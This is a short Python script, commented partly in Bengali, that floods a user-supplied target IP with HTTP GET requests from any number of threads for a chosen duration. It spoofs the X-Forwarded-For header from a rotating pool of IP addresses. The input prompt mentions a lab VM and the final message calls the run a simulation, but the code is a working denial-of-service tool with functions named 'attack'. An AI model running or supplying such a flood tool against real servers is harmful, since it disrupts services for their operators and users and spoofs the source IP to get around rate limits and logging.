import threading
import requests
import time
import random

# -------------------------
# Input Section
# -------------------------
target = input("Enter Target IP (only your lab VM!): ")
threads_count = int(input("Enter number of threads: "))
duration = int(input("Enter attack duration in seconds: "))

# Example IP pool for random source simulation
ip_pool = ["192.168.1.101","192.168.1.102","192.168.1.103","192.168.1.104"]

stop_time = time.time() + duration
print_lock = threading.Lock()

# -------------------------
# Function to simulate requests
# -------------------------
def attack(thread_id):
    fake_ip = random.choice(ip_pool)
    last_ip_change = time.time()

    while time.time() < stop_time:
        # প্রতি 10 সেকেন্ডে random IP change
        if time.time() - last_ip_change >= 10:
            fake_ip = random.choice(ip_pool)
            last_ip_change = time.time()

        headers = {"X-Forwarded-For": fake_ip}
        try:
            r = requests.get(f"http://{target}", headers=headers, timeout=5)
            with print_lock:
                print(f"[Thread-{thread_id}] [{fake_ip}] Status: {r.status_code}")
        except requests.exceptions.RequestException as e:
            with print_lock:
                print(f"[Thread-{thread_id}] [{fake_ip}] Error: {e}")
        
        time.sleep(1)  # 1 সেকেন্ড delay

# -------------------------
# Start threads
# -------------------------
thread_list = []
for i in range(threads_count):
    t = threading.Thread(target=attack, args=(i+1,))
    t.start()
    thread_list.append(t)

# Wait for all threads to finish
for t in thread_list:
    t.join()

print("Simulation finished!")
